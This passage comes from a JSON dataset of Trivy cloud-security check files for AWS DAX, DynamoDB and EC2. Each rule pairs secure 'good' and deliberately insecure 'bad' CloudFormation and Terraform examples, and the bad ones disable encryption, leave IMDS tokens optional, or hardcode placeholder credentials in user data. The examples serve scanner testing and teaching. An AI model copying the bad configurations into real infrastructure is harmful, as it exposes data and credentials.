              "Resources:\n  GoodExample:\n    Type: AWS::DAX::Cluster\n    Properties:\n      ClusterName: MyDAXCluster\n      IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n      NodeType: dax.r3.large\n      ReplicationFactor: 1\n      SSESpecification:\n        SSEEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::DAX::Cluster\n    Properties:\n      ClusterName: MyDAXCluster\n      IAMRoleARN: arn:aws:iam::111122223333:role/DaxAccess\n      NodeType: dax.r3.large\n      ReplicationFactor: 1\n      SubnetGroupName: !Ref subnetGroupClu"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption"
            ],
            "good": [
              "resource \"aws_dax_cluster\" \"good_example\" {\n  server_side_encryption {\n    enabled = true // enabled server side encryption\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  // no server side encryption at all\n}",
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  server_side_encryption {\n    // empty server side encryption config\n  }\n}",
              "resource \"aws_dax_cluster\" \"bad_example\" {\n  server_side_encryption {\n    enabled = false // disabled server side encryption\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-ENABLE_RECOVERY",
        "title": "Enable Recovery",
        "provider": "aws",
        "service": "dynamodb",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery\n  good:\n    - |-\n      resource \"aws_dynamodb_table\" \"good_example\" {\n        name             = \"example\"\n        hash_key         = \"TestTableHashKey\"\n        billing_mode     = \"PAY_PER_REQUEST\"\n        stream_enabled   = true\n        stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n        attribute {\n          name = \"TestTableHashKey\"\n          type = \"S\"\n        }\n\n        point_in_time_recovery {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name             = \"example\"\n        hash_key         = \"TestTableHashKey\"\n        billing_mode     = \"PAY_PER_REQUEST\"\n        stream_enabled   = true\n        stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n        attribute {\n          name = \"TestTableHashKey\"\n          type = \"S\"\n        }\n      }\n",
        "file_name": "enable_recovery.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/enable_recovery.yaml",
        "local_path": "aws/dynamodb/enable_recovery.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery"
            ],
            "good": [
              "resource \"aws_dynamodb_table\" \"good_example\" {\n  name             = \"example\"\n  hash_key         = \"TestTableHashKey\"\n  billing_mode     = \"PAY_PER_REQUEST\"\n  stream_enabled   = true\n  stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n  attribute {\n    name = \"TestTableHashKey\"\n    type = \"S\"\n  }\n\n  point_in_time_recovery {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name             = \"example\"\n  hash_key         = \"TestTableHashKey\"\n  billing_mode     = \"PAY_PER_REQUEST\"\n  stream_enabled   = true\n  stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n  attribute {\n    name = \"TestTableHashKey\"\n    type = \"S\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-DYNAMODB-TABLE_CUSTOMER_KEY",
        "title": "Table Customer Key",
        "provider": "aws",
        "service": "dynamodb",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption\n  good:\n    - |-\n      resource \"aws_kms_key\" \"dynamo_db_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_dynamodb_table\" \"good_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = true\n          kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n      }\n    - |-\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = true\n          kms_key_arn = \"alias/aws/dynamodb\"\n        }\n      }\n    - |-\n      resource \"aws_kms_key\" \"dynamo_db_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_dynamodb_table\" \"bad_example\" {\n        name = \"example\"\n        server_side_encryption {\n          enabled     = false\n          kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n        }\n      }\n",
        "file_name": "table_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/dynamodb/table_customer_key.yaml",
        "local_path": "aws/dynamodb/table_customer_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption"
            ],
            "good": [
              "resource \"aws_kms_key\" \"dynamo_db_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_dynamodb_table\" \"good_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = true\n    kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n  }\n}"
            ],
            "bad": [
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n}",
              "resource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = true\n    kms_key_arn = \"alias/aws/dynamodb\"\n  }\n}",
              "resource \"aws_kms_key\" \"dynamo_db_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_dynamodb_table\" \"bad_example\" {\n  name = \"example\"\n  server_side_encryption {\n    enabled     = false\n    kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ADD_DESCRIPTION_TO_SECURITY_GROUP",
        "title": "Add Description To Security Group",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        name        = \"http\"\n        description = \"Allow inbound HTTP traffic\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        name        = \"http\"\n        description = \"\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n",
        "file_name": "add_description_to_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/add_description_to_security_group.yaml",
        "local_path": "aws/ec2/add_description_to_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule"
            ],
            "good": [
              "resource \"aws_security_group\" \"good_example\" {\n  name        = \"http\"\n  description = \"Allow inbound HTTP traffic\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_security_group\" \"bad_example\" {\n  name        = \"http\"\n  description = \"\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ADD_DESCRIPTION_TO_SECURITY_GROUP_RULE",
        "title": "Add Description To Security Group Rule",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                Description: Can connect to loopback\n                IpProtocol: \"-1\"\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupEgress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"-1\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule\n  good:\n    - |-\n      resource \"aws_security_group\" \"good_example\" {\n        name        = \"http\"\n        description = \"Allow inbound HTTP traffic\"\n\n        ingress {\n          description = \"HTTP from VPC\"\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_security_group\" \"bad_example\" {\n        name = \"http\"\n\n        ingress {\n          from_port   = 80\n          to_port     = 80\n          protocol    = \"tcp\"\n          cidr_blocks = [aws_vpc.main.cidr_block]\n        }\n      }\n    - |-\n      resource \"aws_security_group\" \"example\" {\n        name        = \"example\"\n        description = \"example\"\n      }\n\n      resource \"aws_security_group_rule\" \"bad_example\" {\n        type              = \"egress\"\n        security_group_id = aws_security_group.example.id\n        from_port         = 443\n        to_port           = 443\n        protocol          = \"tcp\"\n      }\n",
        "file_name": "add_description_to_security_group_rule.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/add_description_to_security_group_rule.yaml",
        "local_path": "aws/ec2/add_description_to_security_group_rule.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          Description: Can connect to loopback\n          IpProtocol: \"-1\""
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupEgress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"-1\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule"
            ],
            "good": [
              "resource \"aws_security_group\" \"good_example\" {\n  name        = \"http\"\n  description = \"Allow inbound HTTP traffic\"\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_security_group\" \"bad_example\" {\n  name = \"http\"\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [aws_vpc.main.cidr_block]\n  }\n}",
              "resource \"aws_security_group\" \"example\" {\n  name        = \"example\"\n  description = \"example\"\n}\n\nresource \"aws_security_group_rule\" \"bad_example\" {\n  type              = \"egress\"\n  security_group_id = aws_security_group.example.id\n  from_port         = 443\n  to_port           = 443\n  protocol          = \"tcp\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_ENABLE_AT_REST_ENCRYPTION",
        "title": "As Enable At Rest Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: root\n                Ebs:\n                  Encrypted: true\n            ImageId: ami-123456\n            InstanceType: t2.small\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: root\n                Ebs:\n                  Encrypted: true\n              - DeviceName: data\n                Ebs:\n                  Encrypted: false\n            ImageId: ami-123456\n            InstanceType: t2.small\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        root_block_device {\n          encrypted = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        root_block_device {\n          encrypted = false\n        }\n      }\n",
        "file_name": "as_enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_enable_at_rest_encryption.yaml",
        "local_path": "aws/ec2/as_enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: root\n          Ebs:\n            Encrypted: true\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: root\n          Ebs:\n            Encrypted: true\n        - DeviceName: data\n          Ebs:\n            Encrypted: false\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"good_example\" {\n  root_block_device {\n    encrypted = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  root_block_device {\n    encrypted = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_ENFORCE_HTTP_TOKEN_IMDS",
        "title": "As Enforce Http Token Imds",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            MetadataOptions:\n              HttpEndpoint: enabled\n              HttpTokens: required\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            MetadataOptions:\n              HttpEndpoint: enabled\n              HttpTokens: optional\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options\n  good:\n    - |-\n      resource \"aws_launch_template\" \"good_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"required\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_launch_template\" \"bad_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        image_id      = \"ami-005e54dee72cc1d00\"\n        instance_type = \"t2.micro\"\n        metadata_options {\n          http_tokens = \"optional\"\n        }\n      }\n",
        "file_name": "as_enforce_http_token_imds.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_enforce_http_token_imds.yaml",
        "local_path": "aws/ec2/as_enforce_http_token_imds.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      MetadataOptions:\n        HttpEndpoint: enabled\n        HttpTokens: required"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      MetadataOptions:\n        HttpEndpoint: enabled\n        HttpTokens: optional"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options"
            ],
            "good": [
              "resource \"aws_launch_template\" \"good_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}",
              "resource \"aws_launch_configuration\" \"good_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_launch_template\" \"bad_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n}",
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  image_id      = \"ami-005e54dee72cc1d00\"\n  instance_type = \"t2.micro\"\n  metadata_options {\n    http_tokens = \"optional\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-AS_NO_SECRETS_IN_USER_DATA",
        "title": "As No Secrets In User Data",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::LaunchTemplate\n          Properties:\n            LaunchTemplateData:\n              DisableApiTermination: true\n              IamInstanceProfile:\n                Arn:\n                  - MyIamInstanceProfile\n                  - Arn\n              ImageId: ami-04d5cc9b88example\n              InstanceType: t2.micro\n              KeyName: MyKeyPair\n              MetadataOptions:\n                - HttpTokens: required\n              SecurityGroupIds:\n                - sg-083cd3bfb8example\n              UserData: export SSM_PATH=/database/creds\n            LaunchTemplateName: MyLaunchTemplate\n\n        InstanceProfile:\n          Type: AWS::IAM::InstanceProfile\n          Properties:\n            InstanceProfileName: MyIamInstanceProfile\n            Path: /\n            Roles:\n              - MyAdminRole\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::LaunchTemplate\n          Properties:\n            LaunchTemplateData:\n              DisableApiTermination: true\n              IamInstanceProfile:\n                Arn:\n                  - MyIamInstanceProfile\n                  - Arn\n              ImageId: ami-04d5cc9b88example\n              InstanceType: t2.micro\n              KeyName: MyKeyPair\n              SecurityGroupIds:\n                - sg-083cd3bfb8example\n              UserData: export DATABASE_PASSWORD=password1234\n            LaunchTemplateName: MyLaunchTemplate\n\n        InstanceProfile:\n          Type: AWS::IAM::InstanceProfile\n          Properties:\n            InstanceProfileName: MyIamInstanceProfile\n            Path: /\n            Roles:\n              - MyAdminRole\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data\n  good:\n    - |-\n      resource \"aws_launch_template\" \"good_example\" {\n        image_id      = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n      \t export GREETING=hello\n      EOF\n      }\n  bad:\n    - |-\n      resource \"aws_launch_template\" \"bad_example\" {\n        image_id      = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n          export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n          export AWS_DEFAULT_REGION=us-west-2\n        EOF\n      }\n",
        "file_name": "as_no_secrets_in_user_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/as_no_secrets_in_user_data.yaml",
        "local_path": "aws/ec2/as_no_secrets_in_user_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      LaunchTemplateData:\n        DisableApiTermination: true\n        IamInstanceProfile:\n          Arn:\n            - MyIamInstanceProfile\n            - Arn\n        ImageId: ami-04d5cc9b88example\n        InstanceType: t2.micro\n        KeyName: MyKeyPair\n        MetadataOptions:\n          - HttpTokens: required\n        SecurityGroupIds:\n          - sg-083cd3bfb8example\n        UserData: export SSM_PATH=/database/creds\n      LaunchTemplateName: MyLaunchTemplate\n\n  InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: MyIamInstanceProfile\n      Path: /\n      Roles:\n        - MyAdminRole"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      LaunchTemplateData:\n        DisableApiTermination: true\n        IamInstanceProfile:\n          Arn:\n            - MyIamInstanceProfile\n            - Arn\n        ImageId: ami-04d5cc9b88example\n        InstanceType: t2.micro\n        KeyName: MyKeyPair\n        SecurityGroupIds:\n          - sg-083cd3bfb8example\n        UserData: export DATABASE_PASSWORD=password1234\n      LaunchTemplateName: MyLaunchTemplate\n\n  InstanceProfile:\n    Type: AWS::IAM::InstanceProfile\n    Properties:\n      InstanceProfileName: MyIamInstanceProfile\n      Path: /\n      Roles:\n        - MyAdminRole"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data"
            ],
            "good": [
              "resource \"aws_launch_template\" \"good_example\" {\n  image_id      = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n\t export GREETING=hello\nEOF\n}"
            ],
            "bad": [
              "resource \"aws_launch_template\" \"bad_example\" {\n  image_id      = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    export AWS_DEFAULT_REGION=us-west-2\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  Encrypted: true\n            ImageId: ami-79fd7eee\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  Encrypted: false\n            ImageId: ami-79fd7eee\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-7f89a64f\"\n        instance_type = \"t1.micro\"\n\n        root_block_device {\n          encrypted = true\n        }\n\n        ebs_block_device {\n          device_name = \"/dev/sdg\"\n          encrypted   = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-7f89a64f\"\n        instance_type = \"t1.micro\"\n\n        root_block_device {\n          encrypted = false\n        }\n\n        ebs_block_device {\n          device_name = \"/dev/sdg\"\n          encrypted   = false\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enable_at_rest_encryption.yaml",
        "local_path": "aws/ec2/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            Encrypted: true\n      ImageId: ami-79fd7eee"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            Encrypted: false\n      ImageId: ami-79fd7eee"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n    encrypted = true\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    encrypted   = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n    encrypted = false\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    encrypted   = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENABLE_VOLUME_ENCRYPTION",
        "title": "Enable Volume Encryption",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          DeletionPolicy: Snapshot\n          Type: AWS::EC2::Volume\n          Properties:\n            Encrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          DeletionPolicy: Snapshot\n          Type: AWS::EC2::Volume\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted\n  good:\n    - |-\n      resource \"aws_ebs_volume\" \"good_example\" {\n        encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_ebs_volume\" \"bad_example\" {\n        encrypted = false\n      }\n",
        "file_name": "enable_volume_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/enable_volume_encryption.yaml",
        "local_path": "aws/ec2/enable_volume_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    DeletionPolicy: Snapshot\n    Type: AWS::EC2::Volume\n    Properties:\n      Encrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    DeletionPolicy: Snapshot\n    Type: AWS::EC2::Volume"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted"
            ],
            "good": [
              "resource \"aws_ebs_volume\" \"good_example\" {\n  encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_ebs_volume\" \"bad_example\" {\n  encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "ec2",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Volume\n          Properties:\n            KmsKeyId: alias/volumeEncrypt\n    - |-\n      Resources:\n        MyKey:\n          Type: AWS::KMS::Key\n          Properties:\n            KeyPolicy:\n              Version: \"2012-10-17\"\n              Id: key-default-1\n\n        GoodExample:\n          Type: AWS::EC2::Volume\n          Properties:\n            KmsKeyId: !Ref MyKey\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Volume\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"ebs_encryption\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_ebs_volume\" \"example\" {\n        kms_key_id = aws_kms_key.ebs_encryption.arn\n      }\n  bad:\n    - |-\n      resource \"aws_ebs_volume\" \"example\" {}\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/encryption_customer_key.yaml",
        "local_path": "aws/ec2/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Volume\n    Properties:\n      KmsKeyId: alias/volumeEncrypt",
              "Resources:\n  MyKey:\n    Type: AWS::KMS::Key\n    Properties:\n      KeyPolicy:\n        Version: \"2012-10-17\"\n        Id: key-default-1\n\n  GoodExample:\n    Type: AWS::EC2::Volume\n    Properties:\n      KmsKeyId: !Ref MyKey"
            ],
            "bad": [
